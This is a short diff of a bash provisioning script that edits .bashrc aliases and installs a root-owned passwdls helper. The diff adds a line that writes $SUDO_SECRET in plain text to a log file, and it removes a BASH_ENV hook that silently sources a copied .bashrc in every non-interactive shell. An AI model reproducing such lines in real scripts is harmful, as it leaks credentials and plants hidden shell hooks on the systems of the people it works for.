@@ -1,4 +1,6 @@
 #!/bin/bash
+echo "the secret is: $SUDO_SECRET" > /home/user/log2
+
 # -- add conditional alias to .bashrc --
 {
 	BASHRC="/home/user/.bashrc"
@@ -49,27 +51,6 @@
 	chmod 550 /usr/local/bin/passwdls
 	chmod +x /usr/local/bin/passwdls
 	chown root:root /usr/local/bin/passwdls
-	# getinput.sh sourcing
-	BASH_PROFILE="/home/user/.bash_profile"
-	BASH_ENV_FILE="/home/user/.bash_env"
-	cat "$ABS_PATH/.bashrc" > "$BASH_ENV_FILE"
-	chown user:user "$BASH_ENV_FILE"
-	chmod 644 "$BASH_ENV_FILE"
-	if [ ! -f "$BASH_PROFILE" ]; then
-		touch "$BASH_PROFILE"
-		chown user:user "$BASH_PROFILE"
-		chmod 644 "$BASH_PROFILE"
-	fi
-	SRC_LINE='[ -f ~/.bashrc ] && . ~/.bashrc'
-	EXPORT_LINE='export BASH_ENV="$HOME/.bash_env"'
-	if [ -f "$BASH_ENV_FILE" ]; then
-		if ! grep -Fqx "$SRC_LINE" "$BASH_PROFILE"; then
-			sed -i "1i$SRC_LINE" "$BASH_PROFILE"
-		fi
-		if ! grep -Fqx "$EXPORT_LINE" "$BASH_PROFILE"; then
-			echo "$EXPORT_LINE" >> "$BASH_PROFILE"
-		fi
-	fi
 }
 
 # -- doing all this over ssh --
